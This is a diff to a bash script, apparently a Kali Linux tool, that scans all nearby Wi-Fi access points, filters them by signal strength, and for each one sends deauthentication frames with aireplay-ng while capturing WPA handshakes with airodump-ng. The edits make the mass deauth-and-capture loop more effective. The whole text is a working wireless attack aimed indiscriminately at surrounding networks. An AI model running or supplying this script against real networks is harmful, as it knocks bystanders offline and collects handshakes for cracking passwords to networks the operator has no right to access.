@@ -68,40 +68,47 @@ checkHandshakes() {
 
 active() {
   trap "rm /home/kali/sha* > /dev/null;rm /home/kali/cleanshakes.hccapx > /dev/null" EXIT
+  airmon-ng check kill
   airmon-ng start $2
   echo "Collect APs..."
   timeout 20 airodump-ng -w /home/kali/shakesCollector $2 </dev/null >/dev/null
   counter=0
-  while read line; do
-    if [[ $counter -lt 2 ]]; then
-      counter=$(($counter + 1))
-      continue
+  while IFS=, read -r bssid firsttimeseen lasttimeseen channel speed privacy cipher auth power beacons; do
+    if [[ $counter -lt 2 ]] 
+    then
+            counter=$(($counter + 1))
+            continue
     fi
 
-    channel=$(echo $line | awk '{print $6}')
-    channel=${channel::-1} #delete last ,
-    bssid=$(echo $line | awk '{print $1}')
-    bssid=${bssid::-1}
+    if [[ $power -lt -70 ]]
+    then
+            continue
+    fi
+    if [[ $power == "" ]]
+    then 
+            break
+    fi
     echo "BSSID:" $bssid
     echo "Channel:" $channel
+    echo "Power: " $power
 
     iwconfig $2 channel $channel
     echo "Start airodump..."
     airodump-ng --bssid $bssid --channel $channel -w /home/kali/shakes $2 </dev/null >/dev/null &
     pid=`echo $!`
     echo "Start sending deauth frame injection..."
-    aireplay-ng -a $bssid -0 7 $2 
+    aireplay-ng -a $bssid -0 10 $2 
     injectionExitCode=`echo $?`
     if [[ $injectionExitCode -ne 0 ]]
     then
             kill -9 $pid
             continue
     fi
-    sleep 30
+    sleep 20
     kill -9 $pid
     checkHandshakes $1
     rm /home/kali/shakes-* >/dev/null
-  done </home/kali/shakesCollector-01.csv
+  done < <(tail -n +2  /home/kali/shakesCollector-01.csv)
 
 }
 
